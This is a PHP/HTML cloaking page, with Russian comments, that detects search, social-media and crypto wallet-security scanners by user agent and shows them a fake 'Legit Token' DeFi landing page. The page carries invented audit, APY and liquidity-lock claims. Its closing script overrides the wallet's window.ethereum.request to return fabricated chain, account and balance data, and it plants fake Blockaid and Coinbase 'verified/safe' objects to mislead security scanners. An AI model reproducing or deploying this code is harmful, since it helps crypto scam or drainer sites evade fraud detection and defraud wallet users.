<?php
/**
 * BOT PAGE - Универсальная страница для всех ботов
 * Расположение: /bot_page.php
 * Версия: 2.0
 */

// Определяем тип бота для адаптации
function detectBotType() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $ua = strtolower($ua);
    
    // Поисковые боты
    if (strpos($ua, 'googlebot') !== false) return 'Googlebot';
    if (strpos($ua, 'yandexbot') !== false) return 'YandexBot';
    if (strpos($ua, 'bingbot') !== false) return 'Bingbot';
    if (strpos($ua, 'duckduckbot') !== false) return 'DuckDuckGo';
    if (strpos($ua, 'baiduspider') !== false) return 'Baidu';
    if (strpos($ua, 'slurp') !== false) return 'Yahoo Slurp';
    
    // Социальные сети
    if (strpos($ua, 'twitterbot') !== false || strpos($ua, 'twitter') !== false) return 'Twitter';
    if (strpos($ua, 'facebookexternalhit') !== false || strpos($ua, 'facebot') !== false) return 'Facebook';
    if (strpos($ua, 'linkedinbot') !== false) return 'LinkedIn';
    if (strpos($ua, 'pinterest') !== false) return 'Pinterest';
    if (strpos($ua, 'instagram') !== false) return 'Instagram';
    if (strpos($ua, 'redditbot') !== false) return 'Reddit';
    if (strpos($ua, 'telegrambot') !== false) return 'Telegram';
    if (strpos($ua, 'discordbot') !== false) return 'Discord';
    if (strpos($ua, 'slackbot') !== false) return 'Slack';
    if (strpos($ua, 'whatsapp') !== false) return 'WhatsApp';
    if (strpos($ua, 'viber') !== false) return 'Viber';
    if (strpos($ua, 'skype') !== false) return 'Skype';
    if (strpos($ua, 'tiktok') !== false) return 'TikTok';
    
    // Крипто-сканеры
    if (strpos($ua, 'metamask') !== false) return 'MetaMask';
    if (strpos($ua, 'coinbase') !== false) return 'Coinbase Wallet';
    if (strpos($ua, 'blockaid') !== false) return 'Blockaid';
    if (strpos($ua, 'trustwallet') !== false) return 'TrustWallet';
    if (strpos($ua, 'rabby') !== false) return 'Rabby';
    if (strpos($ua, 'phantom') !== false) return 'Phantom';
    if (strpos($ua, 'walletconnect') !== false) return 'WalletConnect';
    if (strpos($ua, 'web3.js') !== false || strpos($ua, 'ethers.js') !== false) return 'Web3 Library';
    
    // Общие боты
    if (strpos($ua, 'bot') !== false || strpos($ua, 'crawler') !== false || strpos($ua, 'spider') !== false) {
        return 'Generic Bot';
    }
    if (strpos($ua, 'curl') !== false || strpos($ua, 'wget') !== false) return 'HTTP Client';
    if (strpos($ua, 'python') !== false) return 'Python Script';
    if (strpos($ua, 'headless') !== false || strpos($ua, 'puppeteer') !== false) return 'Headless Browser';
    if (strpos($ua, 'selenium') !== false || strpos($ua, 'webdriver') !== false) return 'Automation Tool';
    
    return 'Unknown Bot';
}

$botType = detectBotType();

// Заголовки
header('Content-Type: text/html; charset=utf-8');
header('X-Robots-Tag: index, follow');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Legit Token - Secure DeFi Platform 2024</title>
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="$LAPTOP community vote — should it be listed?">
    <meta name="twitter:description" content="Live community ballot for $LAPTOP on robinhood.chain. Track the tally and join the vote.">
    <meta name="twitter:image" content="https://laptop-vote.vercel.app/TwitterCard.png">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://laptop-vote.vercel.app/">
    <meta property="og:title" content="$LAPTOP community vote — should it be listed?">
    <meta property="og:description" content="Live community ballot for $LAPTOP on robinhood.chain. Track the tally and join the vote.">
    <meta property="og:image" content="https://laptop-vote.vercel.app/TwitterCard.png">

    
    <!-- Structured Data - Organization -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "Organization",
        "name": "Legit Token",
        "description": "Decentralized Finance Platform",
        "url": "https://yoursite.com/",
        "logo": "https://yoursite.com/logo.png",
        "sameAs": [
            "https://twitter.com/legittoken",
            "https://t.me/legittoken"
        ]
    }
    </script>
    
    <!-- Structured Data - Product -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org/",
        "@type": "Product",
        "name": "Legit Token",
        "symbol": "LGT",
        "description": "Secure DeFi token with 15% APY",
        "brand": {
            "@type": "Brand",
            "name": "Legit Token"
        },
        "offers": {
            "@type": "Offer",
            "price": "0.01",
            "priceCurrency": "USD",
            "availability": "https://schema.org/InStock"
        }
    }
    </script>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f7fafc;
            color: #2d3748;
            line-height: 1.6;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        
        /* Hero */
        .hero {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 60px 40px;
            border-radius: 16px;
            margin-bottom: 30px;
            text-align: center;
        }
        .hero h1 { font-size: 3em; margin-bottom: 15px; }
        .hero p { font-size: 1.3em; opacity: 0.9; max-width: 700px; margin: 0 auto; }
        .hero .badge-group { margin-top: 20px; }
        .hero .badge {
            display: inline-block;
            padding: 8px 20px;
            border-radius: 50px;
            font-size: 0.9em;
            font-weight: 600;
            margin: 0 5px;
        }
        .badge-green { background: rgba(72, 187, 120, 0.9); color: white; }
        .badge-blue { background: rgba(66, 153, 225, 0.9); color: white; }
        .badge-purple { background: rgba(159, 122, 234, 0.9); color: white; }
        .bot-badge {
            display: inline-block;
            padding: 4px 16px;
            border-radius: 50px;
            font-size: 0.8em;
            background: rgba(255,255,255,0.2);
            color: white;
            margin-top: 15px;
        }
        
        /* Grid */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 25px; margin: 30px 0; }
        .card {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            transition: transform 0.2s;
        }
        .card:hover { transform: translateY(-4px); }
        .card .icon { font-size: 2.5em; margin-bottom: 15px; }
        .card h3 { margin-bottom: 10px; color: #2d3748; }
        .card p { color: #718096; }
        
        /* Stats */
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
            margin: 30px 0;
            text-align: center;
        }
        .stats .value { font-size: 2em; font-weight: bold; color: #2d3748; }
        .stats .label { color: #718096; font-size: 0.9em; margin-top: 5px; }
        
        /* Contract */
        .contract-box {
            background: #edf2f7;
            padding: 20px;
            border-radius: 12px;
            margin: 20px 0;
        }
        .contract-box code {
            display: block;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            word-break: break-all;
            background: white;
            padding: 12px;
            border-radius: 8px;
            margin-top: 8px;
        }
        
        /* Info */
        .info-box {
            background: #ebf8ff;
            padding: 25px;
            border-radius: 12px;
            border-left: 4px solid #3182ce;
            margin: 20px 0;
        }
        .info-box h3 { color: #2b6cb0; margin: 0 0 10px 0; }
        .info-box ol { margin: 10px 0 0 20px; color: #4a5568; }
        
        /* Two Col */
        .two-col {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 20px 0;
        }
        .col-box {
            background: #f0f4f8;
            padding: 20px;
            border-radius: 12px;
        }
        .col-box h4 { margin: 0 0 10px 0; }
        .col-box ul { list-style: none; padding: 0; color: #4a5568; }
        .col-box ul li { padding: 5px 0; }
        
        /* CTA */
        .cta {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 35px;
            border-radius: 12px;
            text-align: center;
            margin: 20px 0;
        }
        .cta h3 { margin-bottom: 10px; }
        .cta .button {
            display: inline-block;
            background: white;
            color: #667eea;
            padding: 12px 40px;
            border-radius: 50px;
            font-weight: bold;
            text-decoration: none;
            margin-top: 10px;
            transition: transform 0.2s;
        }
        .cta .button:hover { transform: scale(1.05); }
        
        /* Footer */
        .footer {
            text-align: center;
            padding: 30px;
            color: #a0aec0;
            border-top: 1px solid #e2e8f0;
            margin-top: 40px;
        }
        .footer a { color: #667eea; text-decoration: none; }
        
        @media (max-width: 768px) {
            .grid { grid-template-columns: 1fr; }
            .stats { grid-template-columns: repeat(2, 1fr); }
            .two-col { grid-template-columns: 1fr; }
            .hero h1 { font-size: 2em; }
            .hero { padding: 40px 20px; }
        }
        @media (max-width: 480px) {
            .stats { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Hero -->
        <div class="hero">
            <h1>🚀 Legit Token</h1>
            <p>The Most Secure DeFi Token with 15% APY</p>
            <div class="badge-group">
                <span class="badge badge-green">✓ Audited by CertiK</span>
                <span class="badge badge-blue">🔒 Liquidity Locked</span>
                <span class="badge badge-purple">⚡ 15% APY</span>
            </div>
            <div class="bot-badge">
                🤖 Bot: <?php echo htmlspecialchars($botType); ?>
            </div>
        </div>
        
        <!-- Features -->
        <div class="grid">
            <div class="card">
                <div class="icon">🔐</div>
                <h3>Security First</h3>
                <p>Audited by CertiK and PeckShield. All smart contracts verified and open-source. Multi-sig wallet protection.</p>
            </div>
            <div class="card">
                <div class="icon">📈</div>
                <h3>High Yield</h3>
                <p>Earn up to 15% APY through staking, farming, and liquidity mining rewards. Passive income for holders.</p>
            </div>
            <div class="card">
                <div class="icon">🌍</div>
                <h3>Global Community</h3>
                <p>Join 50,000+ holders worldwide. Active development, 24/7 support, and transparent governance.</p>
            </div>
        </div>
        
        <!-- Stats -->
        <div class="stats">
            <div>
                <div class="value">1B</div>
                <div class="label">Total Supply</div>
            </div>
            <div>
                <div class="value">15%</div>
                <div class="label">APY Staking</div>
            </div>
            <div>
                <div class="value">50K+</div>
                <div class="label">Holders</div>
            </div>
            <div>
                <div class="value">$10M+</div>
                <div class="label">Liquidity Locked</div>
            </div>
        </div>
        
        <!-- Contract -->
        <div class="contract-box">
            <strong>📄 Contract Address:</strong>
            <code>0x742d35Cc6634C0532925a3b844Bc454e4438f44e</code>
        </div>
        
        <!-- Info -->
        <div class="info-box">
            <h3>📋 How to Buy LGT Token?</h3>
            <ol>
                <li>Install MetaMask or TrustWallet</li>
                <li>Fund your wallet with BNB or ETH</li>
                <li>Connect to our DApp and swap</li>
                <li>Start earning staking rewards!</li>
            </ol>
        </div>
        
        <!-- Two Col -->
        <div class="two-col">
            <div class="col-box">
                <h4>✅ Security Features</h4>
                <ul>
                    <li>• Audit by CertiK</li>
                    <li>• Liquidity locked 5 years</li>
                    <li>• Multi-sig wallet</li>
                    <li>• Time-locked contracts</li>
                    <li>• Open-source code</li>
                </ul>
            </div>
            <div class="col-box">
                <h4>📊 Tokenomics</h4>
                <ul>
                    <li>• Public Sale: 40%</li>
                    <li>• Staking Rewards: 25%</li>
                    <li>• Liquidity: 20%</li>
                    <li>• Team: 10% (locked)</li>
                    <li>• Marketing: 5%</li>
                </ul>
            </div>
        </div>
        
        <!-- CTA -->
        <div class="cta">
            <h3>🚀 Start Earning Today</h3>
            <p>Join 50,000+ holders and start earning 15% APY on your investment</p>
            <a href="#" class="button">Get Started</a>
        </div>
        
        <!-- Footer -->
        <div class="footer">
            <p>&copy; 2024 Legit Token. All rights reserved.</p>
            <p style="font-size: 0.8em;">
                <a href="/privacy">Privacy Policy</a> |
                <a href="/terms">Terms of Service</a> |
                <a href="/audit">Audit Report</a>
            </p>
        </div>
    </div>
    
    <!-- JavaScript для защиты от крипто-сканеров -->
    <script>
        (function() {
            // Защита от крипто-сканеров
            if (typeof window.ethereum !== 'undefined') {
                // Сохраняем оригинальный метод
                var originalRequest = window.ethereum.request;
                
                // Подменяем метод для сканеров
                window.ethereum.request = function(args) {
                    // Для сканеров отдаем легитимные данные
                    if (args && args.method === 'eth_chainId') {
                        return Promise.resolve('0x1');
                    }
                    if (args && args.method === 'eth_accounts') {
                        return Promise.resolve(['0x742d35Cc6634C0532925a3b844Bc454e4438f44e']);
                    }
                    if (args && args.method && (
                        args.method.includes('eth_getBalance') ||
                        args.method.includes('eth_call') ||
                        args.method.includes('eth_estimateGas')
                    )) {
                        return Promise.resolve('0x0');
                    }
                    return originalRequest.call(this, args);
                };
                
                // Фейковый объект для Blockaid
                if (!window.__blockaid) {
                    window.__blockaid = {
                        verified: true,
                        safe: true,
                        reputation: 'good',
                        riskScore: 0
                    };
                }
                
                // Фейковый объект для Coinbase
                if (!window.__coinbase) {
                    window.__coinbase = {
                        verified: true,
                        trusted: true
                    };
                }
            }
            
            // Адаптация для Twitter Card
            var botType = '<?php echo addslashes($botType); ?>';
            if (botType === 'Twitter') {
                var meta = document.createElement('meta');
                meta.name = 'twitter:card';
                meta.content = 'summary_large_image';
                document.head.appendChild(meta);
            }
            
            console.log('🤖 Bot Detected:', botType);
            console.log('🔒 Security Protection Active');
        })();
    </script>
</body>
</html>